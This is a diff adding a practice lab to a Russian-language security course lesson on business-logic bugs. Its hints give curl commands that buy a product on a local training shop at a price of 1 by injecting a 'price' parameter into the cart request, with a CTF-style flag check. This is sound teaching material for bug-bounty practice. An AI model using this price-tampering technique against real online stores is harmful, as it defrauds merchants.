@@ -12,6 +12,18 @@ useful_for:
   - "Bug bounty"
 estimated_minutes: 45
 summary: "Как находить ошибки логики, которых нет в сканерах: манипуляция ценами, купонами, лимитами и гонки условий."
+lab:
+  kind: shell
+  title: "Практика: манипуляция ценой"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - Цена на витрине: `curl -s 'http://shop.local/product/1'`.
+    - В корзину: `curl -s -X POST 'http://shop.local/cart/add' -d 'product=1&qty=1'`.
+    - Сервер доверяет цене из запроса — пришли свою: добавь `&price=1`.
+    - Оформи заказ: `curl -s -X POST 'http://shop.local/checkout' -d 'confirm=1' | tail -1 > found.txt`, затем `check`.
 ---
 
 ## Вопрос, с которого всё начинается
